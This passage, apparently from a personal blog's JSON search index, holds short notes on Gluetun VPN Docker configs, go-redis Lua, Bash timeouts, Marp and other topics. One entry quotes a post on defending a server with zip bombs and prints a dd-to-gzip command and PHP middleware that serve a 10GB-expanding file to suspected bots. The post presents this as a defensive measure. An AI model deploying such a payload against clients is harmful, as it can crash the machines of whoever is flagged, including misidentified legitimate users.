Shadowsocks volumes: - /home/user/gluetun:/gluetun environment: - VPN_SERVICE_PROVIDER=protonvpn # 按照VPN供應商的WireGuard設定檔填寫 - VPN_TYPE=wireguard - WIREGUARD_PRESHARED_KEY= # 預共享密鑰 - WIREGUARD_PRIVATE_KEY= # 私鑰 - WIREGUARD_ADDRESSES= # 填IPV4與IPV6位址，以逗號分隔 - SERVER_COUNTRIES=United Kingdom # 指定伺服器所在國家，以逗號分隔 networks: # (選擇性) 固定Gluetun容器的IP network: ipv4_address: 172.27.0.5 networks: # (選擇性) 固定Gluetun容器的IP network: driver: bridge ipam: config: - subnet: 172.27.0.0/16 gateway: 172.27.0.5 讓容器走 Gluetun 的 VPN 連線 如果容器服務跟 Gluetun 寫在同一個 docker-compose：加入網路模式 network_mode: \u0026ldquo;service:gluetun\u0026rdquo; 如果該容器跟 Gluetun 不是寫在同一個 docker-compose：加入 network_mode: \u0026ldquo;container:gluetun\u0026rdquo; 開啟 Gluetun 的 docker-compose 檔案，把 service 用到的通訊埠(ex:8080)加回來 依序啟動 Gluetun 和 走 Gluetun 的 VPN 連線的服務 容器公共 IP 應當跟您選擇的 VPN 伺服器一致 ","date":"August 1, 2025","hero":"/images/hero/docker.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20250801-gluetun-vpn-docker/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ivonblog.com/posts/gluetun-vpn-docker/\" target=\"_blank\" rel=\"noopener\"\u003eGluetun：讓 Docker 容器走 VPN 連線，沒網路就斷線，使用教學\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"gluetun\"\u003eGluetun\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eOpenVPN\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eservices\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003egluetun\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eimage\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eqmcgaw/gluetun\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003econtainer_name\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003egluetun\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003erestart\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eunless-stopped\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003ecap_add\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eNET_ADMIN\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003edevices\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e/dev/net/tun:/dev/net/tun\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eports\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e8888\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e8888\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e/tcp\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# HTTP proxy\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e8388\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e8388\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e/tcp\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# Shadowsocks\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e8388\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e8388\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e/udp\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# Shadowsocks\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003evolumes\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e/home/user/gluetun:/gluetun\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eenvironment\u003c/span\u003e: \u003cspan style=\"color:#75715e\"\u003e# 按照VPN供應商的OpenVPN設定檔填寫\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eVPN_SERVICE_PROVIDER=protonvpn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eVPN_TYPE=openvpn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eOPENVPN_USER=\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# OpenVPN帳號\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eOPENVPN_PASSWORD=\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# OpenVPN密碼\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eSERVER_COUNTRIES=United Kingdom\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# 指定伺服器所在國家，以逗號分隔\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e     \u003cspan style=\"color:#f92672\"\u003enetworks\u003c/span\u003e: \u003cspan style=\"color:#75715e\"\u003e# (選擇性) 固定Gluetun容器的IP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       \u003cspan style=\"color:#f92672\"\u003enetwork\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eipv4_address\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e172.27.0.5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003enetworks\u003c/span\u003e: \u003cspan style=\"color:#75715e\"\u003e# (選擇性) 固定Gluetun容器的IP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003enetwork\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003edriver\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ebridge\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eipam\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003econfig\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        - \u003cspan style=\"color:#f92672\"\u003esubnet\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e172.27.0.0\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e/16\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#f92672\"\u003egateway\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e172.27.0.5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eWireGuard\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eservices\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003egluetun\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eimage\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eqmcgaw/gluetun\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003econtainer_name\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003egluetun\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003erestart\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eunless-stopped\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003ecap_add\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eNET_ADMIN\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003edevices\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e/dev/net/tun:/dev/net/tun\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eports\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e8888\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e8888\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e/tcp\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# HTTP proxy\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e8388\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e8388\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e/tcp\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# Shadowsocks\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e8388\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e8388\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e/udp\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# Shadowsocks\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003evolumes\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e/home/user/gluetun:/gluetun\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eenvironment\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eVPN_SERVICE_PROVIDER=protonvpn\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# 按照VPN供應商的WireGuard設定檔填寫\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eVPN_TYPE=wireguard\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eWIREGUARD_PRESHARED_KEY=\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# 預共享密鑰\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eWIREGUARD_PRIVATE_KEY=\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# 私鑰\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eWIREGUARD_ADDRESSES=\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# 填IPV4與IPV6位址，以逗號分隔\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eSERVER_COUNTRIES=United Kingdom\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# 指定伺服器所在國家，以逗號分隔\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e     \u003cspan style=\"color:#f92672\"\u003enetworks\u003c/span\u003e: \u003cspan style=\"color:#75715e\"\u003e# (選擇性) 固定Gluetun容器的IP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       \u003cspan style=\"color:#f92672\"\u003enetwork\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eipv4_address\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e172.27.0.5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003enetworks\u003c/span\u003e: \u003cspan style=\"color:#75715e\"\u003e# (選擇性) 固定Gluetun容器的IP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003enetwork\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003edriver\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ebridge\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eipam\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003econfig\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        - \u003cspan style=\"color:#f92672\"\u003esubnet\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e172.27.0.0\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e/16\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#f92672\"\u003egateway\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e172.27.0.5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"讓容器走-gluetun-的-vpn-連線\"\u003e讓容器走 Gluetun 的 VPN 連線\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e如果容器服務跟 Gluetun 寫在同一個 docker-compose：加入網路模式 network_mode: \u0026ldquo;service:gluetun\u0026rdquo;\u003c/li\u003e\n\u003cli\u003e如果該容器跟 Gluetun 不是寫在同一個 docker-compose：加入 network_mode: \u0026ldquo;container:gluetun\u0026rdquo;\u003c/li\u003e\n\u003cli\u003e開啟 Gluetun 的 docker-compose 檔案，把 service 用到的通訊埠(ex:8080)加回來\u003c/li\u003e\n\u003cli\u003e依序啟動 Gluetun 和 走 Gluetun 的 VPN 連線的服務\u003c/li\u003e\n\u003cli\u003e容器公共 IP 應當跟您選擇的 VPN 伺服器一致\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Docker","Gluetun","VPN"],"title":"Gluetun：讓Docker容器走VPN連線，沒網路就斷線，使用教學"},{"categories":["URL","Go","Redis","Lua"],"contents":" Go 实战指南：使用 go-redis 执行 Lua 脚本 Redis command Eval Redis package redis.NewScript, script.Run ","date":"July 22, 2025","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20250722-go-redis-lua/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.liwenzhou.com/posts/Go/go-redis-lua/\" target=\"_blank\" rel=\"noopener\"\u003eGo 实战指南：使用 go-redis 执行 Lua 脚本\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003eRedis command \u003ccode\u003eEval\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eRedis package \u003ccode\u003eredis.NewScript\u003c/code\u003e, \u003ccode\u003escript.Run\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","Go","Redis","Lua"],"title":"Go实战指南：使用 go-redis 执行 Lua 脚本"},{"categories":["URL","BASH","timeout","HTTP"],"contents":" TIL: timeout in Bash scripts\ntimeout 1m ./until.sh\nwrap\ntimeout 1m bash -c \u0026#34;until curl --silent --fail-with-body 10.0.0.1:8080/health; do sleep 1 done\u0026#34; ","date":"June 12, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20250612-bash-timeout/","summary":"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://heitorpb.github.io/bla/timeout/\" target=\"_blank\" rel=\"noopener\"\u003eTIL: timeout in Bash scripts\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003etimeout 1m ./until.sh\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ewrap\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etimeout 1m bash -c \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;until curl --silent --fail-with-body 10.0.0.1:8080/health; do\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\tsleep 1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003edone\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","BASH","timeout","HTTP"],"title":"TIL: timeout in Bash scripts"},{"categories":["URL","Youtube","台語"],"contents":" TaigiTube 台語水管 ","date":"May 8, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20250508-taigitube/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://taigitube.com/\" target=\"_blank\" rel=\"noopener\"\u003eTaigiTube 台語水管\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Youtube","台語"],"title":"TaigiTube 台語水管"},{"categories":["URL","HTTP","Security"],"contents":" I use Zip Bombs to Protect my Server\nWhat happens is, they receive the file, read the header that instructs them that it is a compressed file. So they try to decompress the 1MB file to find whatever content they are looking for. But the file expands, and expands, and expands, until they run out of memory and their server crashes. The 1MB file decompresses into a 1GB. This is more than enough to break most bots. However, for those pesky scripts that won\u0026rsquo;t stop, I serve them the 10MB file. This one decompresses into 10GB and instantly kills the script.\ndd if=/dev/zero bs=1G count=10 | gzip -c \u0026gt; 10GB.gz\ndd: The dd command is used to copy or convert data. if: Input file, specifies /dev/zero a special file that produces an infinite stream of zero bytes. bs: block size, sets the block size to 1 gigabyte (1G), meaning dd will read and write data in chunks of 1 GB at a time. count=10: This tells dd to process 10 blocks, each 1 GB in size. So, this will generate 10 GB of zeroed data. middleware\nif (ipIsBlackListed() || isMalicious()) { header(\u0026#34;Content-Encoding: gzip\u0026#34;); header(\u0026#34;Content-Length: \u0026#34;. filesize(ZIP_BOMB_FILE_10G)); // 10 MB readfile(ZIP_BOMB_FILE_10G); exit; } ","date":"May 3, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20250503-zipbomb-protection/","summary":"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://idiallo.com/blog/zipbomb-protection\" target=\"_blank\" rel=\"noopener\"\u003eI use Zip Bombs to Protect my Server\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eWhat happens is, they receive the file, read the header that instructs them that it is a compressed file. So they try to decompress the 1MB file to find whatever content they are looking for. But the file expands, and expands, and expands, until they run out of memory and their server crashes. The 1MB file decompresses into a 1GB. This is more than enough to break most bots. However, for those pesky scripts that won\u0026rsquo;t stop, I serve them the 10MB file. This one decompresses into 10GB and instantly kills the script.\u003c/p\u003e","tags":["URL","HTTP","Security"],"title":"I use Zip Bombs to Protect my Server"},{"categories":["URL","Proxy","Web","HTTP","Debug"],"contents":" 人人都需要一個 HTTP proxy 來 debug Charles Burp Suite mitmproxy ","date":"April 25, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20250425-everyone-need-a-http-proxy-to-debug/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.huli.tw/2025/04/23/everyone-need-a-http-proxy-to-debug/\" target=\"_blank\" rel=\"noopener\"\u003e人人都需要一個 HTTP proxy 來 debug\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003e\u003ca href=\"https://www.charlesproxy.com/\" target=\"_blank\" rel=\"noopener\"\u003eCharles\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://portswigger.net/burp/communitydownload\" target=\"_blank\" rel=\"noopener\"\u003eBurp Suite\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://mitmproxy.org/\" target=\"_blank\" rel=\"noopener\"\u003emitmproxy\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","Proxy","Web","HTTP","Debug"],"title":"人人都需要一個 HTTP proxy 來 debug"},{"categories":["URL","QRCode"],"contents":" Why are QR Codes with capital letters smaller than QR codes with lower-case letters?\n如果你想讓包含 URL 的二維碼擁有盡可能小的實體尺寸，請確保文字全部大寫。\n","date":"April 23, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20250423-why-are-qr-codes-with-capital-letters-smaller-than-qr-codes-with-lower-case-letters/","summary":"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://shkspr.mobi/blog/2025/02/why-are-qr-codes-with-capital-letters-smaller-than-qr-codes-with-lower-case-letters/\" target=\"_blank\" rel=\"noopener\"\u003eWhy are QR Codes with capital letters smaller than QR codes with lower-case letters?\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e如果你想讓包含 URL 的二維碼擁有盡可能小的實體尺寸，請確保文字全部大寫。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","QRCode"],"title":"Why are QR Codes with capital letters smaller than QR codes with lower-case letters?"},{"categories":["URL","markdown","VScode"],"contents":" Marp 教學：Markdown 搭配 VS Code 做簡報，快速輸出為 PPTX 或 PDF，提昇做簡報效率 Install \u0026lsquo;Marp for VS Code\u0026rsquo; 在 Markdown 最前面的 FrontMatter，插入以下屬性，啟用 Marp，並開啟顯示頁數功能 --- marp:true paginate: true --- Markdown 文字都是直排排列的，需要換行請加上\\。 輸入三條橫線---分隔投影片。 插入註解請用\u0026lt;!-- --\u0026gt;語法。 ","date":"April 8, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20250408-vscode-marp-presentation/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ivonblog.com/posts/vscode-marp-presentation/\" target=\"_blank\" rel=\"noopener\"\u003eMarp 教學：Markdown 搭配 VS Code 做簡報，快速輸出為 PPTX 或 PDF，提昇做簡報效率\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003eInstall \u0026lsquo;Marp for VS Code\u0026rsquo;\u003c/li\u003e\n\u003cli\u003e在 Markdown 最前面的 FrontMatter，插入以下屬性，啟用 Marp，並開啟顯示頁數功能\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e---\nmarp:true\npaginate: true\n---\n\u003c/code\u003e\u003c/pre\u003e\u003col start=\"3\"\u003e\n\u003cli\u003eMarkdown 文字都是直排排列的，需要換行請加上\u003ccode\u003e\\\u003c/code\u003e。\u003c/li\u003e\n\u003cli\u003e輸入三條橫線\u003ccode\u003e---\u003c/code\u003e分隔投影片。\u003c/li\u003e\n\u003cli\u003e插入註解請用\u003ccode\u003e\u0026lt;!-- --\u0026gt;\u003c/code\u003e語法。\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","markdown","VScode"],"title":"Marp教學：Markdown搭配VS Code做簡報，快速輸出為PPTX或PDF，提昇做簡報效率"},{"categories":["URL","Go","Protobuf"],"contents":" [译]Go Protobuf：新的 Opaque API protoc --proto_path=. \\ --go_out=./ \\ + --go_opt=default_api_level=API_OPAQUE \\ ","date":"April 7, 2025","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20250407-protobuf-opaque/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.liwenzhou.com/posts/Go/protobuf-opaque/\" target=\"_blank\" rel=\"noopener\"\u003e[译]Go Protobuf：新的 Opaque API\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-diff\" 